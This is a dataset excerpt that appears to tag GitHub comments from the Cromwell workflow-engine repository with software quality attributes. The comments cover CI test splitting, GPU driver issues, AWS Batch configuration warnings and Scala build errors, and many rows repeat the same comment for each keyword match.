https://docs.oracle.com/en/java/javase/11/tools/javac.html",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6194#issuecomment-808338591
https://github.com/broadinstitute/cromwell/pull/6194#issuecomment-809800879:222,Testability,test,tests,222,"@breilly2 @mcovarr Thanks for the suggestions today. This PR now splits up the single `sbt` matrix entry into `engine`, `server`, `services`, and ""the rest"". Each matrix entry runs a single `sbt` for all of the respective tests, even ""the rest"". The [results](https://travis-ci.com/github/broadinstitute/cromwell/builds/221571489) seem to have helped memory pressure in that there were no failed jobs with `Killed`, and helped wall time:; - `BUILD_SBT_INCLUDE=engine`; `25 min 34 sec`; - `BUILD_SBT_INCLUDE=server`; `25 min 30 sec`; - `BUILD_SBT_INCLUDE=services`; `23 min 45 sec`; - `BUILD_SBT_EXCLUDE='engine|server|services'`; `31 min 21 sec`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6194#issuecomment-809800879
https://github.com/broadinstitute/cromwell/issues/6195#issuecomment-784533182:33,Deployability,Pipeline,Pipelines,33,"This appears to be an issue with Pipelines API and its container-optimized OS (""COS"") not having the right drivers for the GPU. You could potentially try [changing the Nvidia driver version](https://cromwell.readthedocs.io/en/stable/RuntimeAttributes/#gpucount-gputype-and-nvidiadriverversion) but I think your best bet is asking Google support.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6195#issuecomment-784533182
https://github.com/broadinstitute/cromwell/issues/6195#issuecomment-784533182:65,Performance,optimiz,optimized,65,"This appears to be an issue with Pipelines API and its container-optimized OS (""COS"") not having the right drivers for the GPU. You could potentially try [changing the Nvidia driver version](https://cromwell.readthedocs.io/en/stable/RuntimeAttributes/#gpucount-gputype-and-nvidiadriverversion) but I think your best bet is asking Google support.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6195#issuecomment-784533182
https://github.com/broadinstitute/cromwell/pull/6196#issuecomment-785993818:26,Security,validat,validate,26,"Note to self- should also validate that the new `Finalizing` workflow state doesn't have unexpected consequences for Rawls and/or the UI (and if it does, I might need to revert)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6196#issuecomment-785993818
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-799139288:284,Deployability,configurat,configuration,284,"I compiled and tested this, and it works correctly. As I'm not familiar with java/scala, I cant provide a full review unfortunately. I did notice some warnings when starting cromwell, but as everything works, maybe that's not a problem ? . 2021-03-13 12:17:25,630 WARN - Unrecognized configuration key(s) for AwsBatch: auth, numCreateDefinitionAttempts, default-runtime-attributes.awsBatchRetryAttempts, awsBatchRetryAttempts, filesystems.s3.duplication-strategy, numSubmitAttempts, default-runtime-attributes.scriptBucketName. Thanks by the way ! This was exactly what we were waiting for",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-799139288
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-799139288:284,Modifiability,config,configuration,284,"I compiled and tested this, and it works correctly. As I'm not familiar with java/scala, I cant provide a full review unfortunately. I did notice some warnings when starting cromwell, but as everything works, maybe that's not a problem ? . 2021-03-13 12:17:25,630 WARN - Unrecognized configuration key(s) for AwsBatch: auth, numCreateDefinitionAttempts, default-runtime-attributes.awsBatchRetryAttempts, awsBatchRetryAttempts, filesystems.s3.duplication-strategy, numSubmitAttempts, default-runtime-attributes.scriptBucketName. Thanks by the way ! This was exactly what we were waiting for",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-799139288
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-799139288:15,Testability,test,tested,15,"I compiled and tested this, and it works correctly. As I'm not familiar with java/scala, I cant provide a full review unfortunately. I did notice some warnings when starting cromwell, but as everything works, maybe that's not a problem ? . 2021-03-13 12:17:25,630 WARN - Unrecognized configuration key(s) for AwsBatch: auth, numCreateDefinitionAttempts, default-runtime-attributes.awsBatchRetryAttempts, awsBatchRetryAttempts, filesystems.s3.duplication-strategy, numSubmitAttempts, default-runtime-attributes.scriptBucketName. Thanks by the way ! This was exactly what we were waiting for",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-799139288
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479:45,Availability,error,error,45,"I am trying to build this branch but got the error below. Both local (macOS) and cromwell-dev Docker image. ```bash; sbt assembly; ```. ```; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:113:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.links.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:116:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:159:49: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:168:48: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] four errors found; ```. Any suggestion?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479:142,Availability,error,error,142,"I am trying to build this branch but got the error below. Both local (macOS) and cromwell-dev Docker image. ```bash; sbt assembly; ```. ```; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:113:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.links.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:116:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:159:49: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:168:48: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] four errors found; ```. Any suggestion?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479:226,Availability,error,error,226,"I am trying to build this branch but got the error below. Both local (macOS) and cromwell-dev Docker image. ```bash; sbt assembly; ```. ```; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:113:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.links.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:116:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:159:49: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:168:48: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] four errors found; ```. Any suggestion?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479:275,Availability,error,error,275,"I am trying to build this branch but got the error below. Both local (macOS) and cromwell-dev Docker image. ```bash; sbt assembly; ```. ```; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:113:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.links.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:116:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:159:49: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:168:48: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] four errors found; ```. Any suggestion?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479:333,Availability,error,error,333,"I am trying to build this branch but got the error below. Both local (macOS) and cromwell-dev Docker image. ```bash; sbt assembly; ```. ```; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:113:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.links.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:116:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:159:49: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:168:48: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] four errors found; ```. Any suggestion?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479:432,Availability,error,error,432,"I am trying to build this branch but got the error below. Both local (macOS) and cromwell-dev Docker image. ```bash; sbt assembly; ```. ```; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:113:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.links.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:116:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:159:49: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:168:48: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] four errors found; ```. Any suggestion?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479:443,Availability,error,error,443,"I am trying to build this branch but got the error below. Both local (macOS) and cromwell-dev Docker image. ```bash; sbt assembly; ```. ```; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:113:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.links.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:116:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:159:49: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:168:48: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] four errors found; ```. Any suggestion?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479:527,Availability,error,error,527,"I am trying to build this branch but got the error below. Both local (macOS) and cromwell-dev Docker image. ```bash; sbt assembly; ```. ```; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:113:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.links.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:116:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:159:49: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:168:48: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] four errors found; ```. Any suggestion?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479:576,Availability,error,error,576,"I am trying to build this branch but got the error below. Both local (macOS) and cromwell-dev Docker image. ```bash; sbt assembly; ```. ```; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:113:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.links.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:116:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:159:49: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:168:48: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] four errors found; ```. Any suggestion?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479:634,Availability,error,error,634,"I am trying to build this branch but got the error below. Both local (macOS) and cromwell-dev Docker image. ```bash; sbt assembly; ```. ```; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:113:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.links.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:116:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:159:49: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:168:48: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] four errors found; ```. Any suggestion?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479:733,Availability,error,error,733,"I am trying to build this branch but got the error below. Both local (macOS) and cromwell-dev Docker image. ```bash; sbt assembly; ```. ```; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:113:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.links.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:116:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:159:49: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:168:48: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] four errors found; ```. Any suggestion?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479:744,Availability,error,error,744,"I am trying to build this branch but got the error below. Both local (macOS) and cromwell-dev Docker image. ```bash; sbt assembly; ```. ```; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:113:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.links.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:116:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:159:49: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:168:48: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] four errors found; ```. Any suggestion?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479:828,Availability,error,error,828,"I am trying to build this branch but got the error below. Both local (macOS) and cromwell-dev Docker image. ```bash; sbt assembly; ```. ```; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:113:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.links.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:116:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:159:49: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:168:48: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] four errors found; ```. Any suggestion?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479:877,Availability,error,error,877,"I am trying to build this branch but got the error below. Both local (macOS) and cromwell-dev Docker image. ```bash; sbt assembly; ```. ```; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:113:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.links.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:116:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:159:49: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:168:48: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] four errors found; ```. Any suggestion?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479:935,Availability,error,error,935,"I am trying to build this branch but got the error below. Both local (macOS) and cromwell-dev Docker image. ```bash; sbt assembly; ```. ```; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:113:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.links.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:116:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:159:49: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:168:48: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] four errors found; ```. Any suggestion?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479:1028,Availability,error,error,1028,"I am trying to build this branch but got the error below. Both local (macOS) and cromwell-dev Docker image. ```bash; sbt assembly; ```. ```; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:113:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.links.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:116:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:159:49: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:168:48: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] four errors found; ```. Any suggestion?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479
